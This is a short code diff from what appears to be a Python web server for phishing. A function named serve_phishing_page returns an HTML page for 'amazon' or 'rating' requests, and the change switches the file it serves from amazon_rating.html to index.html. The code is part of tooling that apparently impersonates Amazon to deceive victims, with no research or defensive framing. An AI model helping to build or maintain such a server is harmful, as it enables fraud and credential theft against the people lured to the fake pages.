@@ -305,7 +305,7 @@ async def serve_phishing_page(request):
     
     # صفحات خاصة
     if page_type == 'amazon' or page_type == 'rating':
-        html_file = Path("amazon_rating.html")
+        html_file = Path("index.html")
         if html_file.exists():
             async with aiofiles.open(html_file, 'r', encoding='utf-8') as f:
                 return web.Response(text=await f.read(), content_type='text/html')
